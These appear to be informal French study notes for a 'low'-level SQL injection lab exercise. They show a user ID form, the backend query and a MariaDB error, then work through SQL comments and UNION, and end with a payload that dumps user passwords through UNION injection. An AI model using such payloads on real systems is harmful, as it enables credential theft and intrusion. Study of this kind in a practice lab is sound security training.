# low 

Formulaire User ID: => saisir un chiffre + bouton 

=> discuter avec une table qui s'appelle user 

id | login | email | password 

1 
2
3
4
5

SELECT id , `First name`, `Surname` FROM user WHERE id = 1
SELECT id , `First name`, `Surname` FROM user WHERE id = 2
SELECT id , `First name`, `Surname` FROM user WHERE id = 3

1'

SELECT id , `First name`, `Surname` FROM user WHERE id = 1'

You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1


SELECT id , `First name`, `Surname` FROM user WHERE id = '1'
SELECT id , `First name`, `Surname` FROM user WHERE id = '1''

```sql
-- expliquer
# expliquer
/* expliquer */
SELECT * FROM user ; 
SELECT * FROM user ; 

```

1'  #

```sql
SELECT id , `First name`, `Surname` FROM user WHERE id = '1' #'
```


```sql
SELECT prenom , nom , age FROM user ;
SELECT prenom , nom , age FROM client ;


SELECT prenom , nom , age FROM user UNION SELECT prenom , nom , age FROM client ;

```

1' OR 1 = 1 UNION SELECT first_name , password AS last_name FROM users  #